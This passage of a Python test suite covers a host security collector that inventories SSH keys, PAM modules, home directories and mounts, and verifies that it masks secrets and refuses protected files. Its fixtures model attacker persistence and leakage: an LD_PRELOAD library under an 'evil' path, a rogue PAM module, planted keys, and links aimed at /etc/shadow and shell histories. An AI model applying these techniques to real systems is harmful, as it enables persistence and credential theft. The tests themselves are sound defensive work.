    def test_includes_and_default_key_locations(self):
        self.write("etc/ssh/sshd_config", b"Include sshd_config.d/*.conf\nPermitRootLogin no\n")
        self.write("etc/ssh/sshd_config.d/10-a.conf", b"PasswordAuthentication no\n")
        self.write("home/jch/.ssh/authorized_keys", f"ssh-ed25519 {ED25519} jch@laptop\n".encode())
        records = collect(self.root, ["ssh"])
        self.assertEqual(
            sorted(sources(records)), ["/etc/ssh/sshd_config", "/etc/ssh/sshd_config.d/10-a.conf"]
        )
        locations = records_named(records, "authorized_keys_locations")[0]["patterns"]
        self.assertEqual(locations, [".ssh/authorized_keys", ".ssh/authorized_keys2"])
        (key,) = self.keys(records)
        self.assertEqual(key["fingerprint"], ED25519_FP)
        self.assertEqual((key["account"], key["comment"], key["line"]), ("jch", "jch@laptop", 1))

    def test_custom_key_file_locations(self):
        self.write("etc/ssh/sshd_config", b"AuthorizedKeysFile /etc/ssh/keys/%u .ssh/extra_keys\n")
        self.write("etc/ssh/keys/root", f"ssh-ed25519 {ED25519}\n".encode())
        self.write("home/jch/.ssh/extra_keys", f"ssh-ed25519 {ED25519}\n".encode())
        self.write("home/jch/.ssh/authorized_keys", f"ssh-ed25519 {ED25519}\n".encode())
        records = collect(self.root, ["ssh"])
        found = sorted((k["account"], k["path"]) for k in self.keys(records))
        # Not the default file: sshd wouldn't read it with this configuration.
        self.assertEqual(
            found, [("jch", "/home/jch/.ssh/extra_keys"), ("root", "/etc/ssh/keys/root")]
        )

    def test_options_comment_and_non_key_lines(self):
        self.write("etc/ssh/sshd_config", b"")
        lines = (
            f'from="10.0.0.0/8",command="backup --token=abc123 now",no-pty ssh-ed25519 {ED25519}'
            f" deploy key\n"
            "-----BEGIN OPENSSH PRIVATE KEY-----\n"
            f"ssh-rsa {ED25519} mislabelled\n"
        )
        self.write("root/.ssh/authorized_keys", lines.encode())
        out = io.BytesIO()
        load_collector(self.root).main(settings(["ssh"]), out=out)
        raw = gzip.decompress(out.getvalue())
        self.assertNotIn(ED25519.encode(), raw)
        self.assertNotIn(b"abc123", raw)
        self.assertNotIn(b"BEGIN", raw)
        records = [json.loads(line) for line in raw.splitlines()]
        # root and toor share /root, so each key is reported for both accounts.
        first, second = [k for k in self.keys(records) if k["account"] == "root"]
        self.assertEqual(
            first["options"],
            [
                {"name": "from", "value": "10.0.0.0/8"},
                {"name": "command", "value": "backup --token=[MASKED:password] now"},
                {"name": "no-pty"},
            ],
        )
        self.assertEqual(first["comment"], "deploy key")
        self.assertEqual(second["embedded_type"], "ssh-ed25519")  # the line says ssh-rsa
        facts = records_named(records, "authorized_keys_file")
        self.assertEqual([f["account"] for f in facts], ["root", "toor"])
        self.assertEqual((facts[0]["keys"], facts[0]["lines_not_keys"]), (2, [2]))

    def test_global_none_disables_default_key_files(self):
        self.write("etc/ssh/sshd_config", b"AuthorizedKeysFile none\n")
        self.write("home/jch/.ssh/authorized_keys", f"ssh-ed25519 {ED25519}\n".encode())
        records = collect(self.root, ["ssh"])
        self.assertEqual(self.keys(records), [])
        locations = records_named(records, "authorized_keys_locations")[0]
        self.assertEqual((locations["patterns"], locations["global_set"]), ([], True))

    def test_match_location_adds_to_the_defaults(self):
        self.write(
            "etc/ssh/sshd_config",
            b"PermitRootLogin no\nMatch User deploy\n    AuthorizedKeysFile /etc/ssh/deploy_keys\n",
        )
        self.write("home/jch/.ssh/authorized_keys", f"ssh-ed25519 {ED25519}\n".encode())
        records = collect(self.root, ["ssh"])
        locations = records_named(records, "authorized_keys_locations")[0]
        self.assertEqual(
            locations["patterns"],
            [".ssh/authorized_keys", ".ssh/authorized_keys2", "/etc/ssh/deploy_keys"],
        )
        self.assertEqual(locations["match"], ["/etc/ssh/deploy_keys"])
        self.assertEqual([k["account"] for k in self.keys(records)], ["jch"])

    def test_first_global_value_wins_through_includes(self):
        self.write(
            "etc/ssh/sshd_config",
            b"Include /etc/ssh/sshd_config.d/*.conf\nAuthorizedKeysFile .ssh/later\n",
        )
        self.write("etc/ssh/sshd_config.d/10.conf", b"AuthorizedKeysFile .ssh/first\n")
        records = collect(self.root, ["ssh"])
        locations = records_named(records, "authorized_keys_locations")[0]
        self.assertEqual(locations["patterns"], [".ssh/first"])

    def test_tab_before_the_comment(self):
        self.write("etc/ssh/sshd_config", b"")
        self.write(
            "home/jch/.ssh/authorized_keys", f"ssh-ed25519\t{ED25519}\tjch@laptop\n".encode()
        )
        (key,) = self.keys(collect(self.root, ["ssh"]))
        self.assertEqual((key["fingerprint"], key["comment"]), (ED25519_FP, "jch@laptop"))

    def test_option_values_are_decoded_before_masking(self):
        collector = load_collector(self.root)
        options = collector.ssh_key_options(
            'command="backup --password=\\"first TAILSECRET\\"",'
            'environment="APP_PASSWORD=first TAILSECRET",environment="LANG=C.UTF-8",'
            "ghp_" + "a" * 36 + "=x,"
            'environment="MYSQL_PWD=hunter2",environment="mysql_pwd=hunter2",'
            'environment="PWD=/srv/app",environment="hunter2-no-equals",'
            'environment="LD_PRELOAD=/opt/evil/x.so",'
            'unknown-option="backup --password=\\"first TAILSECRET\\""'
        )
        self.assertNotIn("TAILSECRET", json.dumps(options))
        self.assertNotIn("a" * 36, json.dumps(options))
        self.assertEqual(options[0]["value"], "backup --password=[MASKED:password]")
        self.assertEqual(
            options[1], {"name": "environment", "variable": "APP_PASSWORD", "value_length": 16}
        )
        self.assertEqual(
            options[2], {"name": "environment", "variable": "LANG", "value": "C.UTF-8"}
        )
        self.assertEqual(options[3], {"known": False, "length": 42})
        self.assertNotIn("hunter2", json.dumps(options))
        # Only allow-listed variables' values are sent; the rest, length only.
        self.assertEqual(
            options[4], {"name": "environment", "variable": "MYSQL_PWD", "value_length": 7}
        )
        self.assertEqual(options[5]["value_length"], 7)
        self.assertEqual(options[6], {"name": "environment", "variable": "PWD", "value_length": 8})
        self.assertEqual(options[7], {"name": "environment", "variable": None, "value_length": 17})
        self.assertEqual(options[8]["value"], "/opt/evil/x.so")
        self.assertEqual(options[9]["known"], False)

    def test_certificates_fingerprint_their_key_like_openssh(self):
        collector = load_collector(self.root)
        for line, fingerprint in (
            ("ssh-ed25519-cert-v01@openssh.com " + ED25519_CERT, ED25519_CERT_FP),
            ("ssh-rsa-cert-v01@openssh.com " + RSA_CERT, RSA_CERT_FP),
        ):
            key = collector.parse_authorized_key(line)
            self.assertEqual((key["fingerprint"], key["certificate"]), (fingerprint, True))

    def test_security_key_certificate_types(self):
        collector = load_collector(self.root)

        def string(data):
            return len(data).to_bytes(4, "big") + data

        cert_type = "sk-ssh-ed25519-cert-v01@openssh.com"
        fields = string(b"\x01" * 32) + string(b"ssh:")
        blob = string(cert_type.encode()) + string(b"nonce") + fields + string(b"rest")
        line = cert_type + " " + base64.b64encode(blob).decode()
        key = collector.parse_authorized_key(line)
        plain = string(b"sk-ssh-ed25519@openssh.com") + fields
        expected = base64.b64encode(hashlib.sha256(plain).digest()).decode().rstrip("=")
        self.assertEqual(key["fingerprint"], "SHA256:" + expected)
        self.assertTrue(
            collector._SSH_KEY_TYPE.match("sk-ecdsa-sha2-nistp256-cert-v01@openssh.com")
        )

    def test_blob_with_no_key_inside_is_not_a_key(self):
        collector = load_collector(self.root)
        self.assertIsNone(collector.parse_authorized_key("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 x"))
        self.assertIsNotNone(collector.parse_authorized_key(f"ssh-ed25519 {ED25519} x"))

    def test_blob_that_is_not_a_key_is_not_echoed(self):
        self.write("etc/ssh/sshd_config", b"")
        inner = b"password=example-secret"
        blob = base64.b64encode(len(inner).to_bytes(4, "big") + inner + b"rest").decode()
        self.write("home/jch/.ssh/authorized_keys", f"ssh-ed25519 {blob}\n".encode())
        out = io.BytesIO()
        load_collector(self.root).main(settings(["ssh"]), out=out)
        raw = gzip.decompress(out.getvalue())
        self.assertNotIn(b"example-secret", raw)
        records = [json.loads(line) for line in raw.splitlines()]
        self.assertEqual(self.keys(records), [])
        (facts,) = records_named(records, "authorized_keys_file")
        self.assertEqual(facts["lines_not_keys"], [1])

    def test_keys_through_a_linked_ssh_directory_are_listed(self):
        # sshd follows the link, so these keys grant access: they must show.
        self.write("etc/ssh/sshd_config", b"")
        self.write("srv/elsewhere/authorized_keys", f"ssh-ed25519 {ED25519}\n".encode())
        Path(self.root, "home/jch").mkdir(parents=True)
        os.symlink("../../srv/elsewhere", Path(self.root, "home/jch/.ssh"))
        records = collect(self.root, ["ssh"])
        (key,) = self.keys(records)
        self.assertEqual(key["path"], "/home/jch/.ssh/authorized_keys")
        self.assertEqual(key["resolved"], "/srv/elsewhere/authorized_keys")
        self.assertEqual(key["fingerprint"], ED25519_FP)
        (link,) = records_named(records, "authorized_keys_link")
        self.assertEqual(
            link["links"], [{"path": "/home/jch/.ssh", "target": "../../srv/elsewhere"}]
        )
        (ssh_dir,) = [d for d in records_named(records, "ssh_dir") if d["path"] == "/home/jch/.ssh"]
        self.assertEqual(ssh_dir["type"], "l")

    def test_keys_in_a_linked_key_file_are_listed(self):
        self.write("etc/ssh/sshd_config", b"")
        self.write("srv/keys", f"ssh-ed25519 {ED25519} planted\n".encode())
        Path(self.root, "home/jch/.ssh").mkdir(parents=True)
        os.symlink("../../../srv/keys", Path(self.root, "home/jch/.ssh/authorized_keys"))
        records = collect(self.root, ["ssh"])
        (key,) = self.keys(records)
        self.assertEqual((key["resolved"], key["comment"]), ("/srv/keys", "planted"))
        (facts,) = records_named(records, "authorized_keys_file")
        self.assertEqual(facts["resolved"], "/srv/keys")

    def test_key_file_linked_to_a_protected_file_is_refused(self):
        self.write("etc/ssh/sshd_config", b"")
        self.write("etc/shadow", ("jch:" + SHA512_HASH + ":20000:0:99999:7:::\n").encode())
        history = f'command="mysql -pS3cret" ssh-ed25519 {ED25519} from history\n'
        self.write("home/jch/.bash_history", history.encode())
        os.makedirs(Path(self.root, "root/.ssh"))
        os.symlink("../../etc/shadow", Path(self.root, "root/.ssh/authorized_keys"))
        os.makedirs(Path(self.root, "home/jch/.ssh"))
        os.symlink("../.bash_history", Path(self.root, "home/jch/.ssh/authorized_keys"))
        out = io.BytesIO()
        load_collector(self.root).main(settings(["ssh"]), out=out)
        raw = gzip.decompress(out.getvalue())
        for secret in (b"saltsalt", b"from history", b"mysql"):
            self.assertNotIn(secret, raw)
        records = [json.loads(line) for line in raw.splitlines()]
        self.assertEqual(self.keys(records), [])
        refused = {r["path"] for r in records_named(records, "unreadable_file")}
        self.assertEqual(refused, {"/etc/shadow", "/home/jch/.bash_history"})

    def test_cut_off_key_file_drops_its_unfinished_line(self):
        self.write("etc/ssh/sshd_config", b"")
        first = f"ssh-ed25519 {ED25519} first\n".encode()
        second = f'ssh-ed25519 {ED25519} password="two words"\n'.encode()
        self.write("home/jch/.ssh/authorized_keys", first + second)
        collector = load_collector(self.root)
        collector.MAX_KEY_FILE_BYTES = len(first) + len(second) - 8  # inside the quotes
        out = io.BytesIO()
        collector.main(settings(["ssh"]), out=out)
        raw = gzip.decompress(out.getvalue())
        self.assertNotIn(b"two", raw)
        records = [json.loads(line) for line in raw.splitlines()]
        self.assertEqual([k["comment"] for k in self.keys(records)], ["first"])
        self.assertTrue(records_named(records, "authorized_keys_file")[0]["truncated"])

    def test_directives_past_the_search_limit_are_a_recorded_gap(self):
        self.write("etc/ssh/sshd_config", b"# padding\n" * 20 + b"AuthorizedKeysFile none\n")
        collector = load_collector(self.root)
        collector.CONFIG_FILE_BYTES = 50
        out = io.BytesIO()
        collector.main(settings(["ssh"]), out=out)
        records = [json.loads(line) for line in gzip.decompress(out.getvalue()).splitlines()]
        (gap,) = records_named(records, "directives_incomplete")
        self.assertEqual((gap["path"], gap["searched_bytes"]), ("/etc/ssh/sshd_config", 50))

    def test_dangling_link_is_described(self):
        self.write("etc/ssh/sshd_config", b"")
        Path(self.root, "home/jch/.ssh").mkdir(parents=True)
        os.symlink("../../../nowhere", Path(self.root, "home/jch/.ssh/authorized_keys"))
        records = collect(self.root, ["ssh"])
        self.assertEqual(self.keys(records), [])
        (unreadable,) = records_named(records, "unreadable_file")
        self.assertEqual(unreadable["path"], "/nowhere")


class PamTests(FixtureRoot):
    def test_config_and_module_directories(self):
        self.write("etc/pam.d/sshd", b"auth include password-auth\n")
        self.write("etc/authselect/password-auth", b"auth required pam_unix.so\n")
        os.symlink("../authselect/password-auth", Path(self.root, "etc/pam.d/password-auth"))
        module = self.write("usr/lib64/security/pam_unix.so", b"\x7fELF fake module")
        self.write("usr/lib64/security/pam_evil.so", b"\x7fELF added")
        os.symlink("usr/lib64", Path(self.root, "lib64"))  # merged /usr: one directory
        records = collect(self.root, ["pam"])
        self.assertEqual(
            sorted(sources(records)), ["/etc/authselect/password-auth", "/etc/pam.d/sshd"]
        )
        files = {f["path"]: f for f in records_named(records, "module_file")}
        self.assertEqual(
            sorted(files),
            [
                "/usr/lib64/security",
                "/usr/lib64/security/pam_evil.so",
                "/usr/lib64/security/pam_unix.so",
            ],
        )
        expected = hashlib.sha256(module.read_bytes()).hexdigest()
        self.assertEqual(files["/usr/lib64/security/pam_unix.so"]["sha256"], expected)
        self.assertEqual(len(records_named(records, "walk_summary")), 1)

    def test_linked_module_directory_is_walked_once_at_its_target(self):
        self.write("usr/lib/security/pam_unix.so", b"\x7fELF")
        Path(self.root, "usr/lib64").mkdir(parents=True)
        os.symlink("../lib/security", Path(self.root, "usr/lib64/security"))
        records = collect(self.root, ["pam"])
        files = [f["path"] for f in records_named(records, "module_file")]
        self.assertEqual(files, ["/usr/lib/security", "/usr/lib/security/pam_unix.so"])

    def test_config_links_never_carry_protected_files(self):
        self.write("etc/passwd", PASSWD.encode())
        self.write("etc/shadow", ("jch:" + SHA512_HASH + ":20000:0:99999:7:::\n").encode())
        self.write("home/jch/.bash_history", b"mysql -uroot -phunter2\n")
        os.makedirs(Path(self.root, "etc/pam.d"))
        os.symlink("../passwd", Path(self.root, "etc/pam.d/accounts"))
        os.symlink("../shadow", Path(self.root, "etc/pam.d/leak"))
        os.link(Path(self.root, "etc/shadow"), Path(self.root, "etc/pam.d/hardlink"))
        os.symlink("../../home/jch/.bash_history", Path(self.root, "etc/pam.d/history"))
        self.write("etc/pam.d/sshd", b"auth required pam_unix.so\n")
        out = io.BytesIO()
        load_collector(self.root).main(settings(["pam"]), out=out)
        raw = gzip.decompress(out.getvalue())
        for secret in (b"saltsalt", b"hunter2"):
            self.assertNotIn(secret, raw)
        records = [json.loads(line) for line in raw.splitlines()]
        self.assertEqual(sorted(sources(records)), ["/etc/pam.d/sshd"])
        refused = [r["path"] for r in records_named(records, "unreadable_file")]
        self.assertEqual(
            sorted(refused),
            ["/etc/pam.d/hardlink", "/etc/passwd", "/etc/shadow", "/home/jch/.bash_history"],
        )
        self.assertNotIn(b"John Example", raw)

    def test_history_in_service_homes_and_aliases_is_refused(self):
        # Apache's home is inside /usr; a hard link under /usr to a user's
        # history, under another name, is refused by inode.
        self.write(
            "etc/passwd",
            b"root:x:0:0:root:/root:/bin/bash\n"
            b"apache:x:48:48::/usr/share/httpd:/sbin/nologin\n"
            b"jch:x:1000:1000::/home/jch:/bin/bash\n",
        )
        self.write("usr/share/httpd/.bash_history", b"CanaryHistory\n")
        self.write("usr/share/httpd/notes", b"CanaryHistory\n")
        self.write("home/jch/.bash_history", b"CanaryHistory\n")
        os.makedirs(Path(self.root, "usr/share/crypto-policies"))
        os.link(
            Path(self.root, "home/jch/.bash_history"),
            Path(self.root, "usr/share/crypto-policies/alias"),
        )
        os.makedirs(Path(self.root, "etc/pam.d"))
        for name, target in (
            ("a", "../../usr/share/httpd/.bash_history"),
            ("b", "../../usr/share/httpd/notes"),
            ("c", "../../usr/share/crypto-policies/alias"),
        ):
            os.symlink(target, Path(self.root, "etc/pam.d", name))
        self.write("etc/pam.d/sshd", b"auth required pam_unix.so\n")
        out = io.BytesIO()
        load_collector(self.root).main(settings(["pam"]), out=out)
        raw = gzip.decompress(out.getvalue())
        self.assertNotIn(b"CanaryHistory", raw)
        records = [json.loads(line) for line in raw.splitlines()]
        self.assertEqual(sorted(sources(records)), ["/etc/pam.d/sshd"])

    def refusal(self, collector, target):
        run, _ = direct_run(collector)
        return run.refusal(target, os.stat(Path(self.root, target.lstrip("/"))))

    def test_runtime_homes_of_service_accounts_stay_readable(self):
        # Ubuntu 22.04: systemd-network, systemd-resolve and systemd-timesync
        # have /run/systemd as home, and /run/systemd/system holds runtime
        # units — evidence the persistence checks must read.
        self.write(
            "etc/passwd",
            b"root:x:0:0:root:/root:/bin/bash\n"
            b"systemd-network:x:100:102::/run/systemd:/usr/sbin/nologin\n"
            b"systemd-resolve:x:101:103::/run/systemd:/usr/sbin/nologin\n"
            b"sshd:x:105:65534::/run/sshd:/usr/sbin/nologin\n"
            b"svc:x:900:900::/usr/local/svc:/bin/bash\n",
        )
        self.write("run/systemd/system/evil.service", b"[Service]\nExecStart=/tmp/x\n")
        self.write("usr/local/svc/notes", b"x\n")
        collector = load_collector(self.root)
        self.assertIsNone(self.refusal(collector, "/run/systemd/system/evil.service"))
        # An account with a login shell keeps its home out, wherever it is.
        self.assertIn("home directory", self.refusal(collector, "/usr/local/svc/notes"))

    def test_service_home_with_history_is_kept_out(self):
        self.write(
            "etc/passwd",
            b"root:x:0:0:root:/root:/bin/bash\napache:x:48:48::/usr/share/httpd:/sbin/nologin\n",
        )
        self.write("usr/share/httpd/notes", b"x\n")
        collector = load_collector(self.root)
        self.assertIsNone(self.refusal(collector, "/usr/share/httpd/notes"))
        # Once a shell has been used as apache, its home is kept out.
        self.write("usr/share/httpd/.bash_history", b"ls\n")
        collector = load_collector(self.root)
        self.assertIn("home directory", self.refusal(collector, "/usr/share/httpd/notes"))

    def test_too_many_pam_files_is_a_recorded_gap(self):
        for name in ("a", "b", "c"):
            self.write("etc/pam.d/" + name, b"auth required pam_unix.so\n")
        collector = load_collector(self.root)
        collector.MAX_DIR_FILES = 2
        out = io.BytesIO()
        collector.main(settings(["pam"]), out=out)
        records = [json.loads(line) for line in gzip.decompress(out.getvalue()).splitlines()]
        (listing,) = records_named(records, "config_dir")
        # Read incrementally: it stops at the limit and says so.
        self.assertEqual((listing["entries"], listing["truncated"]), (2, True))
        self.assertEqual(len(sources(records)), 2)  # the directory's order, cut at the limit


class DomainHomeTests(FixtureRoot):
    """Accounts that log in through NSS (SSSD, LDAP, AD) aren't in /etc/passwd;
    their homes are found on disk."""

    def setUp(self):
        super().setUp()
        self.write("etc/passwd", PASSWD.encode())
        self.write("etc/ssh/sshd_config", b"")
        self.key = f"ssh-ed25519 {ED25519} planted\n".encode()

    def test_keys_in_domain_user_homes_are_listed(self):
        self.write("home/CORP/alice/.ssh/authorized_keys", self.key)  # /home/%d/%u
        self.write("home/bob@corp.example/.ssh/authorized_keys", self.key)  # /home/%u@%d
        self.write("home/CORP/carol/notes.txt", b"not a home\n")
        records = collect(self.root, ["ssh"])
        keys = {k["home"]: k for k in records_named(records, "authorized_key")}
        self.assertEqual(sorted(keys), ["/home/CORP/alice", "/home/bob@corp.example"])
        alice = keys["/home/CORP/alice"]
        self.assertEqual(alice["account"], None)
        self.assertEqual(alice["home_source"], "directory")
        self.assertEqual(alice["owner_uid"], os.getuid())
        self.assertEqual(alice["fingerprint"], ED25519_FP)
        self.assertEqual(records[-1]["modules"]["ssh"]["status"], "ok")

    def test_history_of_unlisted_homes_is_described_and_protected(self):
        self.write("home/CORP/alice/.bash_history", b"mysql -pS3cret\n")
        os.makedirs(Path(self.root, "etc/pam.d"))
        os.symlink("../../home/CORP/alice/.bash_history", Path(self.root, "etc/pam.d/x"))
        out = io.BytesIO()
        load_collector(self.root).main(settings(["accounts", "pam"]), out=out)
        raw = gzip.decompress(out.getvalue())
        self.assertNotIn(b"S3cret", raw)
        records = [json.loads(line) for line in raw.splitlines()]
        (history,) = [
            h for h in records_named(records, "shell_history") if h["path"].startswith("/home/CORP")
        ]
        self.assertEqual(history["home_source"], "directory")
        (homes,) = records_named(records, "homes")
        self.assertEqual(homes["unlisted"], ["/home/CORP/alice"])
        self.assertFalse(homes["truncated"])

    def test_sssd_home_templates_add_roots_and_nothing_else(self):
        self.write(
            "etc/sssd/sssd.conf",
            b"[domain/corp]\noverride_homedir = /srv/homes/%u\n"
            b"ldap_default_authtok = BindPassw0rd\n",
        )
        self.write("srv/homes/dave/.ssh/authorized_keys", self.key)
        out = io.BytesIO()
        load_collector(self.root).main(settings(["accounts", "ssh"]), out=out)
        raw = gzip.decompress(out.getvalue())
        self.assertNotIn(b"BindPassw0rd", raw)
        records = [json.loads(line) for line in raw.splitlines()]
        self.assertIn("/srv/homes", records_named(records, "homes")[0]["roots"])
        self.assertEqual(
            [k["home"] for k in records_named(records, "authorized_key")], ["/srv/homes/dave"]
        )

    def test_per_user_key_files_without_a_local_account(self):
        self.write("etc/ssh/sshd_config", b"AuthorizedKeysFile /etc/ssh/keys/%u\n")
        self.write("etc/ssh/keys/root", self.key)
        self.write("etc/ssh/keys/alice", self.key)
        records = collect(self.root, ["ssh"])
        keys = records_named(records, "authorized_key")
        by_path = {k["path"]: k for k in keys if k["account"] in (None, "root")}
        self.assertEqual(by_path["/etc/ssh/keys/root"]["account"], "root")
        self.assertTrue(by_path["/etc/ssh/keys/alice"]["unattributed"])
        self.assertIsNone(by_path["/etc/ssh/keys/alice"]["account"])

    def test_home_search_is_bounded(self):
        for name in ("a", "b", "c", "d"):
            self.write(f"home/{name}/.ssh/authorized_keys", self.key)
        collector = load_collector(self.root)
        collector.MAX_HOME_ENTRIES = 2
        out = io.BytesIO()
        collector.main(settings(["accounts"]), out=out)
        records = [json.loads(line) for line in gzip.decompress(out.getvalue()).splitlines()]
        (homes,) = records_named(records, "homes")
        self.assertTrue(homes["truncated"])
        self.assertEqual(len(homes["unlisted"]), 2)  # the directory's order, cut at the cap

    def test_linked_home_root_is_searched_and_protected(self):
        # /home -> /srv/homes: the domain user's keys are found there, and a
        # hard link to their history from pam.d is refused.
        self.write("srv/homes/alice/.ssh/authorized_keys", self.key)
        self.write("srv/homes/alice/.bash_history", b"CanaryHistory\n")
        os.symlink("srv/homes", Path(self.root, "home"))
        os.makedirs(Path(self.root, "etc/pam.d"))
        os.link(Path(self.root, "srv/homes/alice/.bash_history"), Path(self.root, "etc/pam.d/leak"))
        out = io.BytesIO()
        load_collector(self.root).main(settings(["ssh", "pam"]), out=out)
        raw = gzip.decompress(out.getvalue())
        self.assertNotIn(b"CanaryHistory", raw)
        records = [json.loads(line) for line in raw.splitlines()]
        (key,) = records_named(records, "authorized_key")
        self.assertEqual(key["home"], "/home/alice")

    def test_cut_short_search_reads_config_only_from_system_locations(self):
        for name in ("a", "b", "c"):
            self.write(f"home/{name}/.bash_history", b"CanaryHistory\n")
        self.write("srv/elsewhere/.bash_history", b"CanaryHistory\n")
        self.write("srv/elsewhere/keys", self.key)
        os.makedirs(Path(self.root, "etc/pam.d"))
        os.symlink("../../srv/elsewhere/.bash_history", Path(self.root, "etc/pam.d/x"))
        self.write("etc/pam.d/sshd", b"auth required pam_unix.so\n")
        self.write("etc/ssh/sshd_config", b"AuthorizedKeysFile /srv/elsewhere/keys .bash_history\n")
        collector = load_collector(self.root)
        collector.MAX_HOME_ENTRIES = 1
        out = io.BytesIO()
        collector.main(settings(["pam", "ssh"]), out=out)
        raw = gzip.decompress(out.getvalue())
        self.assertNotIn(b"CanaryHistory", raw)
        records = [json.loads(line) for line in raw.splitlines()]
        self.assertEqual(sorted(sources(records)), ["/etc/pam.d/sshd", "/etc/ssh/sshd_config"])
        # A key file is still read from wherever sshd reads it.
        keys = [k["path"] for k in records_named(records, "authorized_key")]
        self.assertIn("/srv/elsewhere/keys", keys)

    def test_unreadable_account_list_fails_closed(self):
        self.write("root/.bash_history", b"CanaryHistory\n")
        os.remove(Path(self.root, "etc/passwd"))
        os.makedirs(Path(self.root, "etc/pam.d"))
        os.symlink("../../root/.bash_history", Path(self.root, "etc/pam.d/x"))
        out = io.BytesIO()
        load_collector(self.root).main(settings(["pam"]), out=out)
        self.assertNotIn(b"CanaryHistory", gzip.decompress(out.getvalue()))

    def test_home_like_parent_is_still_searched_below(self):
        self.write("home/CORP/.ssh/authorized_keys", self.key)
        self.write("home/CORP/alice/.ssh/authorized_keys", self.key)
        records = collect(self.root, ["ssh"])
        homes = sorted(k["home"] for k in records_named(records, "authorized_key"))
        self.assertEqual(homes, ["/home/CORP", "/home/CORP/alice"])

    def test_linked_unlisted_home_is_followed(self):
        self.write("srv/alice/.ssh/authorized_keys", self.key)
        Path(self.root, "home").mkdir(exist_ok=True)
        os.symlink("../srv/alice", Path(self.root, "home/alice"))
        records = collect(self.root, ["ssh"])
        (key,) = records_named(records, "authorized_key")
        self.assertEqual((key["home"], key["fingerprint"]), ("/home/alice", ED25519_FP))
        self.assertEqual(key["resolved"], "/srv/alice/.ssh/authorized_keys")

    def test_ssh_records_the_home_search(self):
        records = collect(self.root, ["ssh"])
        self.assertEqual(len(records_named(records, "homes")), 1)

    def test_cut_short_search_fails_closed_for_hard_links(self):
        for name in ("a", "b", "c"):
            self.write(f"home/{name}/.bash_history", b"CanaryHistory\n")
        os.makedirs(Path(self.root, "etc/pam.d"))
        for name in ("a", "b", "c"):
            os.link(
                Path(self.root, f"home/{name}/.bash_history"), Path(self.root, f"etc/pam.d/{name}")
            )
        self.write("etc/pam.d/sshd", b"auth required pam_unix.so\n")
        collector = load_collector(self.root)
        collector.MAX_HOME_ENTRIES = 1
        out = io.BytesIO()
        collector.main(settings(["pam"]), out=out)
        raw = gzip.decompress(out.getvalue())
        self.assertNotIn(b"CanaryHistory", raw)
        records = [json.loads(line) for line in raw.splitlines()]
        self.assertEqual(sorted(sources(records)), ["/etc/pam.d/sshd"])


MOUNTINFO = (
    "22 1 8:1 / / rw - ext4 /dev/sda1 rw\n"
    "40 22 0:40 / /home rw - autofs auto.home rw\n"
    "41 22 0:41 / /mnt/team rw - nfs4 files:/team rw\n"
    "42 40 0:42 / /home/mounted rw - nfs4 files:/home/mounted rw\n"
)


class MountTests(FixtureRoot):
    """Nothing under an automount point or on a network file system is
    looked inside: that would mount network drives, or could hang."""

    def setUp(self):
        super().setUp()
        self.write("proc/self/mountinfo", MOUNTINFO.encode())
        self.write(
            "etc/passwd",
            b"root:x:0:0:root:/root:/bin/bash\nteam:x:1001:1001::/mnt/team/u:/bin/bash\n",
        )
        self.write("etc/ssh/sshd_config", b"")
        self.key = f"ssh-ed25519 {ED25519}\n".encode()

    def test_risk_classification(self):
        collector = load_collector(self.root)
        self.assertIsNone(collector.mount_risk("/home"))  # listing autofs itself is safe
        self.assertEqual(collector.mount_risk("/home/alice"), "automount")
        self.assertEqual(collector.mount_risk("/home/mounted/.ssh"), "network_filesystem")
        self.assertEqual(collector.mount_risk("/mnt/team/u"), "network_filesystem")
        self.assertIsNone(collector.mount_risk("/etc/pam.d"))

    def test_homes_on_automount_and_network_mounts_are_not_examined(self):
        self.write("home/alice/.ssh/authorized_keys", self.key)
        self.write("mnt/team/u/.ssh/authorized_keys", self.key)
        records = collect(self.root, ["accounts", "ssh"])
        self.assertEqual(records_named(records, "authorized_key"), [])
        homes = records_named(records, "homes")[0]
        skipped = {(n["path"], n["reason"]) for n in homes["not_examined"]}
        self.assertIn(("/home/alice", "automount"), skipped)
        self.assertIn(("/mnt/team/u", "network_filesystem"), skipped)
        self.assertEqual(records[-1]["status"], "complete")

    def test_every_file_system_access_is_guarded(self):
        # path() is where every lookup goes: it refuses anything that would
        # look inside an automounted folder or a network drive, however the
        # path is spelled, and leaves everything else alone.
        os.makedirs(Path(self.root, "srv"))
        os.symlink("../home", Path(self.root, "srv/homes"))
        os.symlink("../mnt/team", Path(self.root, "srv/team"))
        collector = load_collector(self.root)
        for unsafe, reason in (
            ("/home/alice/.ssh", "automount"),
            ("/srv/homes/alice/.ssh", "automount"),
            ("/srv/team/x", "network_filesystem"),
            ("/mnt/team", "network_filesystem"),
        ):
            with self.assertRaises(collector.UnsafePath) as caught:
                collector.path(unsafe)
            self.assertEqual(caught.exception.reason, reason, unsafe)
        for safe in ("/home", "/srv/homes", "/etc/pam.d/sshd", "/proc/self/mountinfo"):
            self.assertEqual(collector.path(safe), os.path.join(self.root, safe.lstrip("/")))

    def test_final_link_onto_a_network_drive_is_refused(self):
        os.makedirs(Path(self.root, "srv"))
        os.symlink("../mnt/team", Path(self.root, "srv/conf"))
        self.write("mnt/team/x.conf", b"PermitRootLogin yes\n")
        collector = load_collector(self.root)
        with self.assertRaises(collector.UnsafePath):
            collector.path("/srv/conf")  # listing it would follow the link
        self.write("etc/ssh/sshd_config", b"Include /srv/conf/*.conf\n")
        records = collect(self.root, ["ssh"])
        self.assertEqual(sorted(sources(records)), ["/etc/ssh/sshd_config"])
        self.assertIn(("/srv/conf", "network_filesystem"), self.gaps(records))

    def test_one_refused_include_does_not_cost_its_siblings(self):
        self.write(
            "proc/self/mountinfo",
            (
                MOUNTINFO + "50 22 0:50 / /etc/ssh/sshd_config.d/10-remote.conf rw - nfs4 f:/x rw\n"
            ).encode(),
        )
        self.write("etc/ssh/sshd_config", b"Include /etc/ssh/sshd_config.d/*.conf\n")
        self.write("etc/ssh/sshd_config.d/10-remote.conf", b"PermitRootLogin yes\n")
        self.write("etc/ssh/sshd_config.d/20-local.conf", b"PasswordAuthentication no\n")
        records = collect(self.root, ["ssh"])
        self.assertEqual(
            sorted(sources(records)),
            ["/etc/ssh/sshd_config", "/etc/ssh/sshd_config.d/20-local.conf"],
        )
        self.assertIn(
            ("/etc/ssh/sshd_config.d/10-remote.conf", "network_filesystem"), self.gaps(records)
        )

    def test_mounts_inside_a_walked_directory_are_not_probed(self):
        self.write(
            "proc/self/mountinfo",
